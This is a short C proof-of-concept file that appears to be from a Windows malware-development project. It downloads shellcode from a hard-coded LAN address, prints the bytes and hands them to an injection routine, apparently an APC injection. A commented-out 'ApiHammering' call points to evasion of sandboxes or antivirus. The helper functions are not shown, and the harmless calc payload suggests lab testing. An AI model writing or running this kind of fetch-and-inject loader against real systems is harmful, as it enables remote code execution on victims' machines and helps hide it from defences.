#include <Windows.h>
#include "include/common.h"


// POC for testing APC injection
int main()
{
	// ApiHammering(2000);

	unsigned char* pPayload = NULL;
	
	PSTR url = "http://192.168.231.130/calc.bin";
	
	SIZE_T sSize = Download(&pPayload, url);

	//Printing shellcode
	printf("[*] Shellcode: \n");
	for (SIZE_T i = 0; i < sSize; i++)
	{
		printf("%02X ", pPayload[i]);
	}
	printf("\n");

	if (InitiateInjection(pPayload,sSize))
	{
		return -1;
	}
	return 0;
}